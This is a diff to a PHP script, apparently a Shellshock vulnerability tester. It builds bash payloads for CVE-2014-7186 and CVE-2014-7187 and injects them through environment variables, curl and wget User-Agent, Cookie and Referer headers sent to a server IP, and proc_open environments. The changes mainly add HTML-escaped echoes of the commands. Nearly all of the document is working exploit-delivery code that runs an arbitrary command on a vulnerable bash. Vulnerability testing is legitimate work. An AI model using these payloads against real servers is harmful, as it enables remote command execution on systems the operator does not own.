@@ -96,7 +96,7 @@ switch($lvl)
 	//CVE-2014-7186 vulnerability 
 	case 2	: $str="bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || $cmd";break;
 	//CVE-2014-7187 vulnerability 
-	case 3	: $str="(for x in {1..200} ; do echo \"for x$x in ; do :\"; done; for x in {1..200} ; do echo done ; done) | bash || $cmd";break;
+	case 3	: $str="(for x in {1..200} ; do echo \"for x\$x in ; do :\"; done; for x in {1..200} ; do echo done ; done) | bash || $cmd";break;
 	//case not defined...stop script
 	default	: die("lvl passed is undefined...");break;
 	}
@@ -190,7 +190,9 @@ if(function_exists('exec'))
 	exec("env var='".strFullCmd(strCmd('phpExec'),$lvl)."' /bin/bash -c /bin/true");
 	exec('curl --user-agent '.strFullCmd(strCmd('bashCurl1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.0'),$lvl).' '.$serverIp);
 	exec('wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.0'),$lvl).' '.$serverIp);
-	echo "exec() test = ".htmlentities($_ENV["var"]);	
+	echo htmlentities("exec() test = ".$_ENV["var"])."<br><br>";	
+	echo htmlentities('exec() test = curl --user-agent '.strFullCmd(strCmd('bashCurl1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.0'),$lvl).' '.$serverIp)."<br><br>";
+	echo htmlentities('exec() test = wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.0'),$lvl).' '.$serverIp)."<br><br>";
 	}
 else{echo "php exec isnot activated on this server<br>";}
 
@@ -201,7 +203,9 @@ if(function_exists('shell_exec'))
 	shell_exec("env var='".strFullCmd(strCmd('phpShellExec'),$lvl)."' /bin/bash -c /bin/true");
 	shell_exec('curl --user-agent '.strFullCmd(strCmd('bashCurl1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.1'),$lvl).' '.$serverIp);
 	shell_exec('wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.1'),$lvl).' '.$serverIp);
-	echo "shell_exec() test = ".htmlentities($_ENV["var"]);
+	echo htmlentities("shell_exec() test = ".$_ENV["var"])."<br><br>";	
+	echo htmlentities('shell_exec() test = curl --user-agent '.strFullCmd(strCmd('bashCurl1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.1'),$lvl).' '.$serverIp)."<br><br>";
+	echo htmlentities('shell_exec() test = wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.1'),$lvl).' '.$serverIp)."<br><br>";
 	}
 else{echo "php shell_exec isnot activated on this server<br>";}
 
@@ -211,6 +215,8 @@ else{echo "php shell_exec isnot activated on this server<br>";}
 if(function_exists('curl_exec'))
 	{
 	echo '<h1>SHELL SHOCK EXPLOIT TEST (php headers using curl)</h1>';
+	echo htmlentities(strFullCmd(strCmd('phpCurl'),$lvl))."<br><br>";	
+	
 	$frogg	= curl_init();
 	curl_setopt($frogg,CURLOPT_URL,$serverOriIp);
 	curl_setopt($frogg,CURLOPT_HEADER,true);					
@@ -238,6 +244,8 @@ else{echo "php curl_exec isnot activated on this server<br>";}
 if(function_exists('file_get_contents'))
 	{
 	echo '<h1>SHELL SHOCK EXPLOIT TEST (php headers using file_get_contents)</h1>';
+	echo htmlentities(strFullCmd(strCmd('phpWget'),$lvl))."<br><br>";
+	
 	$opts = array(
 				'http'=>array(
 					'method'	=> "GET",
@@ -258,14 +266,10 @@ else{echo "php file_get_contents isnot activated on this server<br>";}
  ******************************************/	
 if(function_exists('proc_open'))
 	{
-	echo '<h1>SHELL SHOCK EXPLOIT TEST (php proc_open)</h1>';
-	
-	
-	
-	
+	echo '<h1>SHELL SHOCK EXPLOIT TEST (php proc_open)</h1>';	
+	echo htmlentities(strFullCmd(strCmd('proc_open'),$lvl))."<br><br>";
 	
 	$env=array	(	
-					//'test0' => '() { :;}; echo "<font color=red>THIS SHELL IS VULNERABLE</font>"',
 					'test0' => strFullCmd('echo "<font color=red>THIS SHELL IS VULNERABLE</font>"',$lvl),
 					'var' => strFullCmd(strCmd('proc_open'),$lvl),
 					/*
